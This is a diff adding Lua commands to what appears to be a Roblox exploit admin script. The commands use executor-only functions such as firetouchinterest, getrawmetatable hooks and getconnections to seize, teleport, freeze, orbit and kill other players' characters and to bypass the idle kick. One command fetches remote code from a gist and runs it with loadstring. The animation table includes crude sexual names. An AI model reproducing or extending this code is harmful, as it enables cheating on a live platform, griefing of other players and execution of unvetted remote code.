+	if (User.Character:FindFirstChildOfClass("Humanoid") and User.Character:FindFirstChildOfClass("Humanoid").Sit) then 
+		return Utils.Notify(Caller or LocalPlayer, "Couldn't attach", ("%s is sitting down"):format(User.Name));
+	end
+	local char = Players.LocalPlayer.Character
+	local target = User.Character
+	local tool = Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool");
+	if (tool) then
+		tool.Parent = LocalPlayer.Character
+		tool.Handle.Size = Vector3.new(4, 4, 4);
+		local HumanoidRootPart = Utils.GetRoot(target)
+		if HumanoidRootPart then
+			for i = 1, 3 do
+				firetouchinterest(HumanoidRootPart, tool.Handle, 0);
+				wait();
+				firetouchinterest(HumanoidRootPart, tool.Handle, 1);
+			end
+		end
+	end
+end
+
+
+AddCommand("oldclaim", {"claim2"}, "oldclaim\nclaim from fates admin v1", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	if (#Target > 1) then
+		for _, v in next, Target  do
+			if (v ~= LocalPlayer and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Sit == false and LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or LocalPlayer.Character:FindFirstChildOfClass("Tool")) then
+				if (v.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 and LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6) then 
+					attach(v);
+				else
+					attach(v);
+				end
+			end
+		end
+		local char = LocalPlayer.Character
+		local HumanoidRootPart = Utils.GetRoot(char)
+		local oldpos = Utils.GetRootCFrame(char)
+		for i = 1, 3 do
+			wait();
+			HumanoidRootPart.CFrame = CFrame.new(0, -9999999999, 0);
+		end
+		HumanoidRootPart.CFrame = oldpos
+		for _, v in next, char:GetChildren() do
+			if (v:IsA("Part")) then
+				v:Destroy();
+			end
+		end
+		re = LocalPlayer.CharacterAdded:Connect(function()
+			LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+		end)
+	else
+		local char = LocalPlayer.Character
+		local target = Target[1].Character
+		local hum = char:FindFirstChildOfClass("Humanoid")
+		local HumanoidRootPart = Utils.GetRoot(char)
+		local oldpos = Utils.GetRootCFrame(char)
+		local HumanoidRootPart2 = Utils.GetRoot(target)
+		local oldpos2 = Utils.GetRootCFrame(target)
+		attach(target);
+		for i = 1, 10 do
+			wait();
+			HumanoidRootPart.CFrame = CFrame.new(0, -9999999999, 0);
+		end
+		for i = 1, 10 do
+			wait();
+			HumanoidRootPart.CFrame = oldpos2
+		end
+		for _, v in next, char:GetChildren() do
+			if (v:IsA("Part")) then
+				v:Destroy();
+			end
+		end
+		re = LocalPlayer.CharacterAdded:Connect(function()
+			LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+		end)
+	end
+end)
+
+--[[ AddCommand("vclaim", {"vc"}, "vclaim {target}\nclaims the person you would like to be able to control the character", function(Caller, Args)
+ 	if not Args[1] then return Utils.Notify(Caller or LocalPlayer, nil, "Missing argument #1.", 5); end;
+ 	if not game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") then return Utils.Notify(Caller or LocalPlayer, nil, "You must have a tool in your backpack!", 5); end;
+ 	local Target = GetPlayer(Args[1]);
+ 	local oldpos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame;
+ 	local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
+ 	Humanoid.Name = "1"
+ 	local Humanoid2 = Humanoid:Clone()
+ 	local targetpos
+ 	Humanoid2.Parent = LocalPlayer.Character
+ 	Humanoid2.Name = "Humanoid"
+ 	Workspace.Camera.CameraSubject = Humanoid2
+ 	wait()
+ 	Humanoid:Destroy();
+ 	for _, v in next, LocalPlayer:GetChildren() do
+ 		if (v:IsA("Tool")) then
+ 			v.Parent = LocalPlayer.Backpack
+ 		end
+ 	end
+ 	for i, v in next, Target do
+ 		if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] or LocalPlayer.Character.Head:FindFirstChild("AlignOrientation")) then
+ 			if (#Target == 1 or LocalPlayer.Character.Head:FindFirstChild("AlignOrientation")) then
+ 				Utils.Notify(Caller or LocalPlayer, nil, "Hold on...");
+ 				LocalPlayer.Character:Destroy();
+ 				LocalPlayer.CharacterAdded:Wait();
+ 				LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+ 				local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid");
+ 				Humanoid.Name = "1"
+ 				local Humanoid2 = Humanoid:Clone()
+ 				Humanoid2.Parent = LocalPlayer.Character
+ 				Humanoid2.Name = "Humanoid"
+ 				Workspace.Camera.CameraSubject = Humanoid2
+ 				Humanoid:Destroy();
+ 				wait(.1);
+ 			else
+ 				v = nil;
+ 				break
+ 			end
+ 		end
+ 		if (v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Sit) then 
+ 			return Utils.Notify(Caller or LocalPlayer, "Couldn't claim", ("%s is sitting down"):format(v.Name));
+ 		end
+ 		Workspace.FallenPartsDestroyHeight = math.huge
+ 		local char = Players.LocalPlayer.Character
+ 		local target = v.Character
+ 		targetpos = v.Character:FindFirstChild("HumanoidRootPart").CFrame;
+ 		local HumanoidRootPart = char:FindFirstChild("HumanoidRootPart");
+ 		if (#Target == 1) then
+ 			for _, v in next, char:GetChildren() do
+ 				if (v:IsA("Tool")) then
+ 					v.Parent = LocalPlayer.Backpack
+ 				end
+ 			end
+ 			local tool = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
+ 			tool.Handle.Size = Vector3.new(4, 4, 4)
+ 			tool.Parent = char
+ 			wait();
+ 			for i = 1, 2 do
+ 				target.HumanoidRootPart.CFrame = tool.Handle.CFrame
+ 				wait();
+ 			end
+ 			char.HumanoidRootPart.CFrame = CFrame.new(0, 999999, 0)
+ 			wait();
+ 		else
+ 			coroutine.wrap(function()
+ 				F_A.execmd("bring", Caller, {"others"});
+ 			end)();
+ 			char.HumanoidRootPart.CFrame = CFrame.new(0, 999999, 0);
+ 		end
+ 	end
+ 	wait();
+ 	if (#Target == 1) then
+ 		LocalPlayer.Character.HumanoidRootPart.CFrame = targetpos
+ 	else
+ 		LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+ 	end
+ 	wait(.2)
+ 	LocalPlayer.Character.Head:Destroy();
+ 	LocalPlayer.CharacterAdded:Wait();
+ 	LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+end) ]]--
+
+AddCommand("reset", {"r"}, "reset\nresets your character", function(Caller, Args)
+	LocalPlayer.Character:BreakJoints();
+end)
+
+AddCommand("destroychar", {}, "destroychar\ndestroys your character", function(Caller, Args)
+	LocalPlayer.Character:Destroy();
+end)
+
+AddCommand("refreshchar", {"refresh"}, "refreshchar\ndestroys your character and brings you back to where you were", function(Caller, Args)
+	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait();
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character)
+	F_A.execmd("destroychar", Caller, Args);
+	LocalPlayer.CharacterAdded:Wait();
+	LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+end)
+
+AddCommand("antitp", {}, "anti client teleport", function(Caller, Args)
+	local mt = getrawmetatable(game);
+	local nc = mt.__namecall
+	setreadonly(mt, false);
+
+	mt.__namecall = newcclosure(function(self, ...)
+		local namecallmethod = getnamecallmethod():lower();
+		if namecallmethod == "teleporttoplaceinstance" or namecallmethod == "teleport" then
+			Utils.Notify(Caller or LocalPlayer, nil, ("Attempt to tp to id %s"):format(({...})[1]))		
+			return wait(9e9);
+		end
+		return nc(self, ...);
+	end)
+
+	Utils.Notify(Caller or LocalPlayer, nil, "anti tp is not enabled (only for client tps)")
+end)
+
+
+AddCommand("cbring", {"claimbring"}, "cbring {target}\nbrings a user to yourself (claim required)", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			Utils.GetRoot(v.Character).CFrame = Utils.GetRootCFrame(Caller.Character) * CFrame.new(-5, 0, 0);	
+		end
+	end
+end)
+
+AddCommand("loopbring", {}, "cloopbring {target}\nloopbrings a a user of your choice\nuse the 'unloopbring' command to unloopbring", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	getgenv().loopbring = true
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			coroutine.wrap(function()
+				Loop = RunService.RenderStepped:Connect(function()
+					Utils.GetRoot(v.Character).CFrame = Utils.GetRootCFrame(LocalPlayer.Character) * CFrame.new(-5, 0, 0);
+					wait();
+					if (not Target or not CheckClaim(v)) then Loop:Disconnect(); end
+				end)
+			end)();
+			Tbl[v] = Loop
+		end
+	end
+end)
+
+
+animids = {
+	["billybounce"] = 3381474830,  
+	["orangejustice"] = 3262592866,
+	["rat"] = 4746273203,
+	["brodyquest"] = 3261753939,   
+	["howard"] = 4525385199,       
+	["smug"] = 3450125501,
+	["blender"] = 3534855146,      
+	["turk"] = 3259216638,
+	["felix"] = 3535053121,        
+	["cowboy"] = 3536215993,       
+	["tpose"] = 3273532175,        
+	["joy"] = 3564937614,
+	["notouchin'"] = 3414624197,
+	["armshuffle"] = 3607744332,
+	["robot"] = 4785986705,
+	["boogiedown"] = 3623215692,
+	["electroshuffle"] = 3619935462,
+	["crabby"] = 3643129020,
+	["parrot"] = 3656900015,
+	["scoutrobics"] = 3675001079,
+	["caramelldansen"] = 3690496479,
+	["revenge"] = 3696716156,
+	["gotthat"] = 3742184308,
+	["billiejean"] = 4792883833,
+	["praisethe"] = 4776745048,
+	["reckless"] = 3769807555,
+	["karatemoves"] = 3882120151,
+	["cybergoth"] = 3883926195,
+	["bothered"] = 3942752090,
+	["swifthops"] = 3993946754,
+	["spookymonth"] = 4049304710,
+	["spite"] = 4064050153,
+	["roach"] = 4087012028,
+	["gangtorture"] = 4109162757,
+	["alti"] = 4239646681,
+	["comeback"] = 4256820336,
+	["kanye"] = 4261643445,
+	["kneeslapper"] = 4300444948,
+	["heelclick"] = 4369816373,
+	["radical"] = 4686555525,
+	["spookshuffle"] = 4396327238,
+	["carlton"] = 4408536995,
+	["casey"] = 3442913250,
+	["freestylin'"] = 4432024917,
+	["ecstatic"] = 4474845845,
+	["rickroll"] = 4459292790,
+	["wess"] = 4499527946,
+	["flippin,smooth"] = 4539565912,
+	["breakdown"] = 4558409610,
+	["conga"] = 4572096542,
+	["mario"] = 4597363132,
+	["whip"] = 4633952191,
+	["sniper"] = 4677930905,
+	["spy"] = 4677880377,
+	["scout"] = 4679511279,
+	["pyro"] = 4678151003,
+	["heavy"] = 4678225061,
+	["engineer"] = 4677980227,
+	["medic"] = 4679640288,
+	["demoman"] = 4764153637,
+	["soldier"] = 4787449997,
+	["anthony"] = 4809145259,
+	["electroswing"] = 4820078879,
+	["floss"] = 4812941481,
+	["sidehustle"] = 4841015627,
+	["dreamfeet"] = 4300218011,
+	["minecraftparrot"] = 4300228160,
+	["garrydance"] = 4300223810,
+	["shuffle"] = 3485013176,
+	["groundbendbang"] = 4966886065,
+	["laydown"] = 4966882955,
+	["benddown"] = 4966882047,
+	["pushups"] = 4966881089,
+	["sitdown"] = 4966880188,
+	["laydown"] = 4966879039,
+	["bang"] = 4966833843,
+	["blowjob"] = 4963373273,
+	["takethe"] = 4827299133,
+	["aerostep"] = 4776588732,
+	["cleangroove"] = 4776734129,
+	["penismusic"] = 4776560183,
+	["thriller"] = 4846220052,
+	["helicopter"] = 4724894341,
+	["loudlaugh"] = 4846000379,
+	["peterparker"] = 4776598075,
+	["kazotskykick"] = 4776544655,
+	["carsonshearer"] = 5806573931,
+	["rewind"] = 5011408603,
+	["skibidi"] = 4835795413,
+	["spasm"] = 3383725246,
+	["smoothmoves"] = 4900539662,
+	["thriller2.0"] = 4699820365,
+	["doublestep"] = 4715102040,
+	["theroll"] = 4699826237,
+	["anthonyshuffle"] = 4837748730,
+	["penismusic"] = 4719919809,
+	["spongebob"] = 4896926493,
+	["carlton2"] = 4837749916,
+	["billiejean"] = 4791471969,
+	["sidehustle"] = 4863897442,
+	["praisethe"] = 4837753372,
+	["boogiedown"] = 5025546871,
+	["kazotskykick"] = 4846209506,
+	["drip"] = 4959380041,
+	["sidestep"] = 4876471547,
+	["runningin"] = 5009879973,
+	["cruisin"] = 5079952034,
+	["pogo"] = 3053543383,
+	["defaultdance"] = 4776575115,
+	["seashanties"] = 4784189222,
+	["snoop"] = 4831391731,
+	["goopiedance"] = 5238669868,
+}
+
+AddCommand("playanim", {"anim"}, "playanim {id}/name\nplays an animation of your choice", function(Caller, Args)
+	if (not LocalPlayer.Character:FindFirstChild("Re-Animated")) then
+		loadstring(game:HttpGet("https://gist.githubusercontent.com/fatesc/a776370d1291c69d9536204d9771539f/raw/0afd87d1052ca25c6f0b013f2c51d0f22732ca3b/FA.lua"))();
+		Instance.new("BoolValue", LocalPlayer.Character).Name = "Re-Animated";
+		wait(.4);
+	end
+	local animtoplay = Args[1];
+	local speed = tonumber(Args[2])
+	xpcall(playanim(animids[animtoplay], speed), function()
+		xpcall(playanim(animtoplay), function()
+			Utils.Notify(Caller or LocalPlayer, "Error", "Not a valid ID");
+		end)
+	end)
+	Utils.Notify(Caller or LocalPlayer, nil, "Anim Loaded - use the command 'destroychar' if you want to use another animation");
+end)
+
+AddCommand("showanims", {}, "showanims\nprints all the animations", function(Caller, Args)
+	Animations.Visible = true
+	Utils.TweenAllTransToObject(Animations, .25, AnimationsTransparencyClone);
+	Utils.Notify(Caller or LocalPlayer, nil, "Anims shown");
+end)
+
+AddCommand("unloopbring", {}, "unloopbring {target}\nunloopbrings a user", function(Caller, Args)
+	local looped = CommandStuff["Commands"]["loopbring"]
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		for i2, v2 in next, looped do
+			if i2 == v then
+				v2:Disconnect();
+			end
+		end
+	end
+end)
+
+-- AddCommand("hold", {}, "hold {target}\nholds a player in your hand", function(Caller, Args)
+-- 	local Target = GetPlayer(Args[1])
+-- 	if (#Target > 1) then
+-- 		return Utils.Notify(Caller or LocalPlayer, nil, "This command is one player only");
+-- 	end
+-- 	local arm = LocalPlayer.Character["Right Arm"]
+-- 	arm:BreakJoints()
+-- 	local alignOr = Instance.new("AlignOrientation", LocalPlayer.Character["Head"]);
+-- 	local alignPosition = Instance.new("AlignPosition", LocalPlayer.Character["Head"]);
+-- 	local a0 = Instance.new("Attachment", arm);
+-- 	local a1 = Instance.new("Attachment", LocalPlayer.Character["Torso"]);
+-- 	alignPosition.Attachment0 = a0
+-- 	alignPosition.Attachment1 = a1
+-- 	alignPosition.Responsiveness = 200
+-- 	alignOr.Attachment0 = a0
+-- 	alignOr.Attachment1 = a1
+-- 	alignOr.Responsiveness = 200
+-- 	a0.Position = Vector3.new(-1.5, 0.5, 0.5);
+-- 	a0.Orientation = Vector3.new(-90, 0, 0);
+-- 	for i, v in next, Target do
+-- 		loop = RunService.Heartbeat:Connect(function()
+-- 			v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.new(0, 3, 0)
+-- 		if (not CheckClaim(v)) then loop:Disconnect() end
+-- 		end)
+-- 	end
+-- end)
+
+
+AddCommand("grab", {"grabknife", "grabknife {target}"}, "", function(Caller, Args)
+	local target = GetPlayer(Args[1])[1]
+	local LP = LocalPlayer
+	if (LocalPlayer.Character.Head:FindFirstChild("AlignOrientation")) then
+		getgenv().Grab = false
+		local oldpos = Utils.GetRootCFrame(LocalPlayer.Character)
+		LocalPlayer.Character:BreakJoints();
+		LocalPlayer.CharacterAdded:Wait();
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+		wait(.2);
+	end
+	local Hat = LP.Character:FindFirstChild("YandereKnife") or LP.Character:FindFirstChildWhichIsA("Accessory");
+	local player=game:GetService("Players").LocalPlayer local character=player.Character local item=character["Left Arm"]item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])LeftArm=Instance.new("Attachment",item)local a1=Instance.new("Attachment",character["Torso"])alignPosition.Attachment0=LeftArm alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=LeftArm alignOr.Attachment1=a1 alignOr.Responsiveness=200 LeftArm.Position=Vector3.new(0,1,1.5)LeftArm.Orientation=Vector3.new(-90,-20,-50)local player=game:GetService("Players").LocalPlayer local character=player.Character local item=character["Right Arm"]item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])RightArm=Instance.new("Attachment",item)local a1=Instance.new("Attachment",character["Torso"])alignPosition.Attachment0=RightArm alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=RightArm alignOr.Attachment1=a1 alignOr.Responsiveness=200 RightArm.Position=Vector3.new(-0.9,1,-0.5)RightArm.Orientation=Vector3.new(-90,-20,-50)local player=game:GetService("Players").LocalPlayer local character=player.Character local item=Hat.Handle item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])Knife=Instance.new("Attachment",item)a1=Instance.new("Attachment",character["Right Arm"])alignPosition.Attachment0=Knife alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=Knife alignOr.Attachment1=a1 alignOr.Responsiveness=200 Knife.Position=Vector3.new(-0.8,0,1)Knife.Orientation=Vector3.new(0,-90,-90)
+	getgenv().Grab = true
+	UIS = UserInputService.InputBegan:Connect(function(inp, GP)
+		if (GP) then
+			return
+		end
+		function reArm()
+			if (not getgenv().Grab) then
+				LeftArm.Position = Vector3.new(0, 1, 1.5);
+				LeftArm.Orientation = Vector3.new(-90, -20, -50);
+				RightArm.Position = Vector3.new(-0.9, 1, -0.5);
+				RightArm.Orientation = Vector3.new(-90, -20, -50);
+			else
+				LeftArm.Position = Vector3.new(1.5, 0, 0);
+				LeftArm.Orientation = Vector3.new(0, 0, 0);
+				RightArm.Position = Vector3.new(-1.5, 0, 0);
+				RightArm.Orientation = Vector3.new(0, 0, 0);
+			end
+		end
+		if (inp.KeyCode == Enum.KeyCode.K and CheckClaim(target)) then
+			reArm();
+			target.Character.Humanoid.Health = 0
+			getgenv().Grab = getgenv().Grab and not getgenv().Grab
+			Loop:Disconnect();
+			UIS:Disconnect();
+		elseif (inp.KeyCode == Enum.KeyCode.R) then
+			reArm();
+			getgenv().Grab = getgenv().Grab and not getgenv().Grab or not getgenv().Grab
+		end
+	end)
+	coroutine.wrap(function()
+		Loop = RunService.Heartbeat:Connect(function()
+			if (getgenv().Grab) then
+				Utils.GetRoot(target.Character).CFrame = Utils.GetRootCFrame(LP.Character) * CFrame.new(-0.7, 0, -1.35);
+				target.Character:FindFirstChildWhichIsA("Humanoid").JumpPower = 0
+				target.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = 0
+			else
+				target.Character:FindFirstChildWhichIsA("Humanoid").JumpPower = 50
+				target.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = 16
+			end
+			wait();
+			if (not target or not CheckClaim(target) or not target.Character or not LocalPlayer or not LocalPlayer.Character) then
+				Loop:Disconnect();
+			end
+		end)
+	end)()
+end)
+
+AddCommand("goto", {"to"}, "goto {target}\nteleports you to a player", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if v.Character then
+			local pos = Utils.GetRootCFrame(v.Character)
+			Utils.GetRoot(LocalPlayer.Character).CFrame = Utils.GetRootCFrame(v.Character) * CFrame.new(0, 0, -4);
+		end
+	end
+end)
+
+AddCommand("hatsize", {"size"}, "{number}\nTimes to repeat the command", function(Caller, Args)
+	Utils.Notify(Caller or LocalPlayer, nil, "This will only work with rthro hats and if its your only hat equip", 5)
+	for i = 1, tonumber(Args[1]) do
+		wait(0.3)
+		local HatName = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Accessory")
+		local Handle = HatName:FindFirstChild('Handle')
+		HatName.Handle:FindFirstChild("OriginalSize"):Destroy()
+		HatName.Parent = game.Workspace
+		firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, Handle, 0)
+		firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, Handle, 1)
+	end
+end)
+
+AddCommand("bring", {"b1"}, "bring {target}\nfe bring a player (tool required)", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	if (not LocalPlayer.Backpack:FindFirstChildOfClass("Tool") and not LocalPlayer.Character:FindFirstChildOfClass("Tool")) then 
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must have a tool in your backpack!", 5)
+	end;
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character);
+	local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
+	Humanoid.Name = "1"
+	local Humanoid2 = Humanoid:Clone()
+	Humanoid2.Parent = LocalPlayer.Character
+	Humanoid2.Name = "Humanoid"
+	Workspace.Camera.CameraSubject = Humanoid2
+	wait()
+	Humanoid:Destroy();
+	for _, v in next, LocalPlayer:GetChildren() do
+		if (v:IsA("Tool")) then
+			v.Parent = LocalPlayer.Backpack
+		end
+	end
+	for i, v in next, Target do
+		repeat
+			if (v and v.Character and Utils.GetRoot(v.Character) and v.Character:FindFirstChildOfClass("Humanoid")) then
+				if (v.Character.Humanoid.Sit) then
+					Utils.Notify(Caller or LocalPlayer, nil, "player is sitting down");
+					do break end
+				end
+				if RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] then
+					if (#Target == 1) then
+						Utils.Notify(Caller or LocalPlayer, nil, "Hold on...");
+						LocalPlayer.Character:Destroy();
+						LocalPlayer.CharacterAdded:Wait();
+						LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos;
+						local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid");
+						Humanoid.Name = "1"
+						local Humanoid2 = Humanoid:Clone()
+						Humanoid2.Parent = LocalPlayer.Character
+						Humanoid2.Name = "Humanoid"
+						Workspace.Camera.CameraSubject = Humanoid2
+						Humanoid:Destroy();
+						wait();
+					else
+						do break end
+					end
+				end
+				local char = LocalPlayer.Character
+				local target = v.Character
+				local HumanoidRootPart = Utils.GetRoot(char)
+				local THumanoidRootPart = Utils.GetRoot(target)
+	
+				local tool = Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or LocalPlayer.Character:FindFirstChild("Tool");
+				if (not tool) then
+					do break end
+				end
+				tool.Parent = LocalPlayer.Character
+				tool.Handle.Size = Vector3.new(4, 4, 4);
+				cbp(tool, THumanoidRootPart);
+				for i = 1, 3 do
+					if (THumanoidRootPart) then
+						firetouchinterest(THumanoidRootPart, tool.Handle, 0);
+						firetouchinterest(THumanoidRootPart, tool.Handle, 1);
+						cbp(tool, oldpos * CFrame.new(Args[2] ~= "Claim" and -5 or 0, 0, 0));
+
+					end
+				end
+			end
+		until true
+	end
+	local hrp = Utils.GetRoot(LocalPlayer.Character)
+	local chrp = Utils.GetRootCFrame(Caller.Character)
+	hrp.CFrame = chrp
+	wait(.2);
+	if (Args[2] ~= "claim") then
+		LocalPlayer.Character:Destroy();
+		LocalPlayer.CharacterAdded:Wait();
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+	end
+end)
+
+AddCommand("cteleport", {"ctp", "claimteleport", "claimtp"}, "cteleport {target} {target}\nteleports a target to another target (claim required)", function(Caller, Args)
+	local target1, target2 = GetPlayer(Args[1]), GetPlayer(Args[2])[1]
+	for i, v in next, target1 do
+		if (CheckClaim(v)) then
+			Utils.GetRoot(v.Character).CFrame = Utils.GetRootCFrame(target2.Character) * CFrame.new(-5, 0, 0);
+		end
+	end
+end)
+
+AddCommand("tp", {"teleport"}, "tp {target} {target}\nteleports a target to another target (tool required)", function(Caller, Args)
+	if (not LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") or LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) then
+		return Utils.Notify(Caller or LocalPlayer, "Tool Required", "You need a tool for this command");
+	end
+	local target1, target2 = GetPlayer(Args[1])[1], GetPlayer(Args[2])[1]
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character);
+	attach2(target1);
+	Utils.GetRoot(LocalPlayer.Character).CFrame = Utils.GetRootCFrame(target2.Character).CFrame * CFrame.new(-5, 0, 0);
+	wait(.2)
+	respawn = LocalPlayer.CharacterAdded:Connect(function()
+		wait()
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+		respawn:Disconnect();
+	end)
+	LocalPlayer.Character.Head:Destroy();
+end)
+
+AddCommand("ckill", {"claimkill"}, "kills a user of your choice (claim required)", function(Caller, Args)
+	local Target = GetPlayer(Args[1])
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			v.Character:BreakJoints();
+		end
+	end
+end)
+
+AddCommand("void", {"v"}, "void {target}\nvoids the player", function(Caller, Args)
+	if (not LocalPlayer.Backpack:FindFirstChildOfClass("Tool") and not LocalPlayer.Character:FindFirstChildOfClass("Tool")) then 
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must have a tool in your backpack!", 5)
+	end;
+	Utils.GetRoot(LocalPlayer.Character).CFrame = CFrame.new(0, -300, 0);
+	F_A.execmd("bring", Caller, Args);
+end)
+
+AddCommand("orbit", {"aura"}, "orbit {target}\norbits a player around your character (claim required)", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	local Target2 = GetPlayer(Args[2])[1];
+	Caller = Target2 or Caller
+	local Radius = tonumber(Args[3] or 7);
+	local Speed = tonumber(Args[4] or 1);
+	for i, plr in next, Target do
+		if (CheckClaim(plr)) then
+			local bool = Instance.new("BoolValue", plr.Character);
+			bool.Name = "orbit"
+			local random = math.random(tick() / 2, tick());
+			coroutine.wrap(function()
+				Loop = RunService.Heartbeat:Connect(function()
+					Utils.GetRoot(plr.Character).CFrame = CFrame.new(Utils.GetRootCFrame(Caller.Character).p + Vector3.new(math.sin(tick() + random * Speed) * Radius, 0, math.cos(tick() + random * Speed) * Radius), Utils.GetRootCFrame(Caller.Character).p)
+					if (not plr.Character:FindFirstChild("orbit") or not CheckClaim(plr)) then Loop:Disconnect(); end
+				end)
+			end)();
+			Tbl[plr] = Loop
+		end
+	end
+end)
+
+AddCommand("view", {"v"}, "view {target}\nviews the player", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		game.Workspace.Camera.CameraSubject = v.Character.Humanoid
+	end
+end)
+
+AddCommand("unview", {"noview"}, "unview {target}\nviews the player", function(Caller, Args)
+	game.Workspace.Camera.CameraSubject = LocalPlayer.Character.Humanoid
+end)
+
+
+AddCommand("loopview", {"permview"}, "loopview\nloopviews the person", function(Caller, Args, Tbl)
+	F_A.execmd("view", Caller, Args);
+	local Target = GetPlayer(Args[1])
+	for i, v in next, Target do
+		LoopView = Workspace.Camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()			
+			F_A.execmd("view", Caller, {v.Name});
+		end);
+		Tbl[v] = LoopView
+ 	end
+end)
+
+AddCommand("unloopview", {"unpermview", "noloopview"}, "", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, CommandStuff["Commands"]["loopview"] do
+		v:Disconnect();
+	end
+	F_A.execmd("unview", Caller, {});
+end)
+
+AddCommand("unorbit", {"noorbit"}, "unorbit {target}\nstops the looped orbit", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	local Orbited = CommandStuff["Commands"]["orbit"]
+	for i, v in next, Target do
+		for i2, v2 in next, Orbited do
+			if i2 == v then
+				v2:Disconnect();
+			end
+		end
+	end
+end)
+
+AddCommand("infinitejump", {"infjump"}, "infinitejump\nno limit to your jump", function(Caller, Args, Tbl)
+	local InfJump = UserInputService.JumpRequest:Connect(function()
+		if LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then 
+			LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(3);
+		end
+	end)
+	Tbl[#Tbl + 1] = InfJump
+end)
+
+AddCommand("uninfinitejump", {}, "uninfinitejump\nbreaks the infinite jump loop", function(Caller, Args)
+	local InfJump = CommandStuff["Commands"]["infinitejump"]
+	for i, v in next, InfJump do
+		v:Disconnect();
+	end
+end)
+
+AddCommand("antiafk", {}, "antiafk\nmakes the game not kick you when you are afk for 20 mins", function(Caller, Args)
+	if (getconnections) then
+		for i, v in next, getconnections(LocalPlayer.Idled) do
+			for i2, v2 in next, v do
+				if (type(v2) == 'boolean') then
+					v2 = false
+				end
+			end
+		end
+	end
+end)
+
+AddCommand("cfreeze", {}, "cfreeze {target}\nfreezes the player", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			Utils.GetRoot(v.Character).Anchored = true
+			v.Character:FindFirstChild("Head").Anchored = true
+		end
+	end
+end)
+
+AddCommand("uncfreeze", {"unfreeze"}, "uncfreeze {target}\nunfreezes the player if they are already", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			Utils.GetRoot(v.Character).Anchored = false
+			v.Character:FindFirstChild("Head").Anchored = false
+		end
+	end
+end)
+
+AddCommand("spin", {"cspin"}, "spin {target}\nspins a player", function(Caller, Args)
+	local Target, Speed = Args[1] and GetPlayer(Args[1]) or Caller, Args[2] or 5
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			if (Utils.GetRoot(v.Character):FindFirstChild("Spinning")) then
+				Utils.GetRoot(v.Character).Spinning:Destroy();
+			end
+			local spin = Instance.new("BodyAngularVelocity");
